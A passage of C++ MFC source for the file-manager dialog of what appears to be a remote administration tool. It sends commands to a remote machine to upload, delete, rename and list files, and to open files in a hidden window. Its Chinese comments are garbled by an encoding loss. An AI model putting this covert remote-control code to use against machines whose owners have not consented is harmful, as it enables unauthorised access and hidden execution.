		int nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, m_pSendBuffer, nPacketSize);
	}

	//LocalFree(lpBuffer);
}

void CFileManagerDlg::EndLocalUploadFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = FALSE;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		m_ProgressCtrl->SetPos(0);
	} 
	else
	{
		Sleep(5);
		SendUploadJob();
	}
}

void CFileManagerDlg::EndRemoteDeleteFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = FALSE;
		EnableControl(TRUE);
		GetRemoteFileList(".");
	} 
	else
	{
		Sleep(5);
		SendDeleteJob();
	}
}

void CFileManagerDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendTransferMode()
{
	CFileTransferModeDlg dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;

	switch(dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_ADDITION:
		m_nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case IDC_ADDITION_ALL:
		m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDC_CANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}

	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = TRUE;
		EndLocalUploadFile();
		return ;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, (unsigned char*)&bToken, sizeof(bToken));
}

BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE)
			return true;
		if (pMsg->wParam == VK_RETURN)
		{
			if (
				pMsg->hwnd == m_list_local.m_hWnd || 
				pMsg->hwnd == ((CEdit*)m_Local_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				FixedLocalFileList();
			}
			else if 
				(
				pMsg->hwnd == m_list_remote.m_hWnd ||
				pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				GetRemoteFileList();
			}
			return TRUE;
		}

	}
	// �������˴��ڱ��������������ʹ�����ƶ�
	if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd)
	{
		pMsg->message = WM_NCLBUTTONDOWN;
		pMsg->wParam = HTCAPTION;
	}
	/*
	UINT CFileManagerDlg::OnNcHitTest (Cpoint point )
	{
	UINT nHitTest =Cdialog: : OnNcHitTest (point )
	return (nHitTest = =HTCLIENT)? HTCAPTION : nHitTest
	}

	�������������㲻��֮����
	��һ���ڴ��ڵĿͻ�����˫��ʱ�����ڽ�����
	����� �����ʺϰ��������Ӵ������򴰿ڡ�
	*/


	if(m_wndToolBar_Local.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Local.GetParent();
		m_wndToolBar_Local.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}
	if(m_wndToolBar_Remote.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Remote.GetParent();
		m_wndToolBar_Remote.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}
	return CDialogEx::PreTranslateMessage(pMsg);
}


void CFileManagerDlg::ExtractShellIconForDriver()
{
	//ͼ���б�Ϊ�գ�˵���ǵ�һ����ʾԶ�˴����б���shell32.dll��ȡ����ͼ���б�
	if(!(m_ImageListLargeForRemoteDriver.GetImageCount()) && !(m_ImageListSmallForRemoteDriver.GetImageCount()))
	{
		//����ͼ����shell32.dll��λ�ã�6 = floppy��7 = Removable drive�� 8 = Hard disk drive�� 9 = Network drive�� 11 = CD drive
		int ShellIconArray[] = {6, 7, 8, 9, 11}; 

		m_list_remote.SetImageList(&m_ImageListSmallForRemoteDriver, LVSIL_SMALL);
		m_list_remote.SetImageList(&m_ImageListLargeForRemoteDriver, LVSIL_NORMAL);

		HICON hIcon = NULL;
		for (int i = 0; i < sizeof(ShellIconArray) / sizeof(int); i++)
		{
			//bLargeIconsΪ0��ȡͼ�ꡣbLargeIconsΪ1��ȡ��ͼ��
			for (int bLargeIcons = 0; bLargeIcons < 2; bLargeIcons++)
			{
				ExtractIconEx(_T("SHELL32.DLL"), ShellIconArray[i], bLargeIcons ? &hIcon : NULL, bLargeIcons ? NULL : &hIcon, 1);
				if (bLargeIcons)
					m_ImageListLargeForRemoteDriver.Add(hIcon);
				else
					m_ImageListSmallForRemoteDriver.Add(hIcon);
				DestroyIcon(hIcon);
			}	
		}
	}
	else
	{
		m_list_remote.SetImageList(&m_ImageListSmallForRemoteDriver, LVSIL_SMALL);
		m_list_remote.SetImageList(&m_ImageListLargeForRemoteDriver, LVSIL_NORMAL);
	}
}

//�½�Ŀ¼���½��ļ���ʱ�������Ŀ¼�����ڣ����½���Ŀ¼���ٽ���Ŀ¼
bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
	LPTSTR p, pszDirCopy;
	DWORD dwAttributes;

	// Make a copy of the string for editing.

	__try
	{
		pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

		if(pszDirCopy == NULL)
			return FALSE;

		lstrcpy(pszDirCopy, pszDirPath);

		p = pszDirCopy;

		//  If the second character in the path is "\", then this is a UNC
		//  path, and we should skip forward until we reach the 2nd \ in the path.

		if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
		{
			p++;            // Skip over the first \ in the name.
			p++;            // Skip over the second \ in the name.

			//  Skip until we hit the first "\" (\\Server\).

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it.

			if(*p)
			{
				p++;
			}

			//  Skip until we hit the second "\" (\\Server\Share\).

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it also.

			if(*p)
			{
				p++;
			}

		}
		else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
		{
			p++;
			p++;

			// If it exists, skip over the root specifier

			if(*p && (*p == TEXT('\\')))
			{
				p++;
			}
		}

		while(*p)
		{
			if(*p == TEXT('\\'))
			{
				*p = TEXT('\0');
				dwAttributes = GetFileAttributes(pszDirCopy);

				// Nothing exists with this name.  Try to make the directory name and error if unable to.
				if(dwAttributes == 0xffffffff)
				{
					if(!CreateDirectory(pszDirCopy, NULL))
					{
						if(GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(pszDirCopy);
							return FALSE;
						}
					}
				}
				else
				{
					if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						// Something exists with this name, but it's not a directory... Error
						free(pszDirCopy);
						return FALSE;
					}
				}

				*p = TEXT('\\');
			}

			p = CharNext(p);
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		// SetLastError(GetExceptionCode());
		free(pszDirCopy);
		return FALSE;
	}

	free(pszDirCopy);
	return TRUE;
}


void CFileManagerDlg::OnNMRClickListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	//LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CMenu popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu *pM = popup.GetSubMenu(0);

	pM->DeleteMenu(6, MF_BYPOSITION);		//ɾ���˵���ġ�Զ�̴򿪡�

	CPoint p;
	GetCursorPos(&p);

	if (m_list_local.GetSelectedCount() == 0)
	{
		UINT nCount = pM->GetMenuItemCount();
		for(UINT i = 0; i < nCount; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}

	if (m_list_local.GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}

	if (m_list_local.GetSelectedCount() == 1)
	{
		//���ļ���
		if (m_list_local.GetItemData(m_list_local.GetSelectionMark()) == 1)
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
		else
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_ENABLED);
	}
	else
	{
		pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
	}

	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}


void CFileManagerDlg::OnNMRClickListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	//LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CMenu popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu *pM = popup.GetSubMenu(0);

	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);		//ɾ���˵���ġ����ش򿪡�

	CPoint p;
	GetCursorPos(&p);

	if (m_list_remote.GetSelectedCount() == 0)
	{
		UINT nCount = pM->GetMenuItemCount();
		for(UINT i = 0; i < nCount; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}

	if (m_list_remote.GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}

	if (m_list_remote.GetSelectedCount() == 1)
	{
		//���ļ���
		if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
			pM->EnableMenuItem(5, MF_BYPOSITION | MF_GRAYED);
		else
			pM->EnableMenuItem(5, MF_BYPOSITION | MF_ENABLED);
	}
	else
	{
		pM->EnableMenuItem(5, MF_BYPOSITION | MF_GRAYED);
	}

	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


void CFileManagerDlg::OnTransfer()
{
	// TODO: �ڴ���������������
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalCopy();
	} 
	else
	{
		OnRemoteCopy();
	}
}


void CFileManagerDlg::OnRename()
{
	// TODO: �ڴ���������������
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		m_list_local.EditLabel(m_list_local.GetSelectionMark());
	} 
	else
	{
		m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
	}
}


void CFileManagerDlg::OnDelete()
{
	// TODO: �ڴ���������������
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalDelete();
	} 
	else
	{
		OnRemoteDelete();
	}
}


void CFileManagerDlg::OnNewfolder()
{
	// TODO: �ڴ���������������
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalNewfolder();
	}
	else
	{
		OnRemoteNewfolder();
	}
}


void CFileManagerDlg::OnLocalOpen()
{
	// TODO: �ڴ���������������
	CString str;
	str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
	ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
}


void CFileManagerDlg::OnRemoteOpenShow()
{
	// TODO: �ڴ���������������
	CString str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int nPacketLength = str.GetLength() + 2;
	BYTE *lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);

	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);

	LocalFree(lpPacket);
}


void CFileManagerDlg::OnRemoteOpenHide()
{
	// TODO: �ڴ���������������
	CString str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int nPacketLength = str.GetLength() + 2;
	BYTE *lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);

	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);

	LocalFree(lpPacket);
}


void CFileManagerDlg::OnRefresh()
{
	// TODO: �ڴ���������������
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		FixedLocalFileList(".");
	}
	else
	{
		GetRemoteFileList(".");
	}
}


void CFileManagerDlg::OnLvnEndlabeleditListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	CString str, strExistingFileName, strNewFileName;

	m_list_local.GetEditControl()->GetWindowText(str);
	strNewFileName = m_Local_Path + str;
	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);

	*pResult = ::MoveFile(strExistingFileName, strNewFileName);
}


void CFileManagerDlg::OnLvnEndlabeleditListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	CString str, strExistingFileName, strNewFileName;

	m_list_remote.GetEditControl()->GetWindowText(str);
	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName		= m_Remote_Path + str;

	if (strExistingFileName != strNewFileName)
	{
		int nPacketLength = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpPacket	  = (LPBYTE)LocalAlloc(LPTR, nPacketLength);

		lpPacket[0]		  = COMMAND_RENAME_FILE;
		memcpy(lpPacket + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() +1);
		memcpy(lpPacket + 2 + strExistingFileName.GetLength(), strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);

		m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
		LocalFree(lpPacket);
	}
	*pResult = 0;
}
